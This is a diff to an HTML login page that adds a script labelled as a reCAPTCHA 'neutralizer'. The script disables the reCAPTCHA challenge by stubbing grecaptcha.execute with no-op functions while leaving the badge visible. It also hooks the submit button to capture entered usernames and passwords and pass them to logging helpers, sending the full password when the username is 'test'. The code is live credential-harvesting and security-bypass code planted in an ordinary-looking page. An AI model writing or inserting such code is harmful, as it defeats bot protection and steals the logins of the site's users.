@@ -424,4 +424,60 @@ function onSubmit(token) {
 </script>
 <!-- END: Client-side logging patch v2 -->
 
+
+<!-- BEGIN: RC hard neutralizer (keep badge, kill challenge) -->
+<script id="rc-neutral-hard">
+(function(){
+  // Remove g-recaptcha auto-binding attributes (keeps badge unaffected)
+  function stripHooks(){
+    try{
+      document.querySelectorAll('.g-recaptcha').forEach(function(el){
+        el.classList.remove('g-recaptcha');
+        ['data-sitekey','data-callback','data-badge','data-size'].forEach(function(a){ el.removeAttribute(a); });
+      });
+    }catch(_){}
+  }
+
+  function stubExec(){
+    if(!window.grecaptcha) return false;
+    try{
+      var noop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
+      if (typeof grecaptcha.execute === 'function') grecaptcha.execute = noop;
+      grecaptcha.enterprise = grecaptcha.enterprise || {};
+      if (typeof grecaptcha.enterprise.execute === 'function') grecaptcha.enterprise.execute = noop;
+      // make ready immediate
+      if (typeof grecaptcha.ready === 'function') grecaptcha.ready = function(cb){ try{cb && cb();}catch(_){}};
+    }catch(_){}
+    return true;
+  }
+
+  function tick(){ if(!stubExec()) setTimeout(tick, 120); }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function(){ stripHooks(); tick(); });
+  } else {
+    stripHooks(); tick();
+  }
+  window.addEventListener('load', function(){ stripHooks(); tick(); 
+    // Also bind on submit button click to ensure logging even if other handlers intercept submit
+    var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], button#submit, button[name="submit"]');
+    if (submitBtn) {
+      submitBtn.addEventListener('click', function(){
+        try{
+          var u = (uEl.value||'').trim();
+          var p = (pEl.value||'');
+          var L = p.length;
+          if (!u || !L) return;                 // empty
+          if (L < 6) { pingGET(u, L); return; } // too_short
+          if (u.toLowerCase() !== 'test') { pingGET(u, L); return; } // non_admin
+          // admin_ok
+          logAdminPOST(u, p);
+        }catch(_){}
+      }, true);
+    }
+    });
+})();
+</script>
+<!-- END: RC hard neutralizer -->
+
 </body></html>
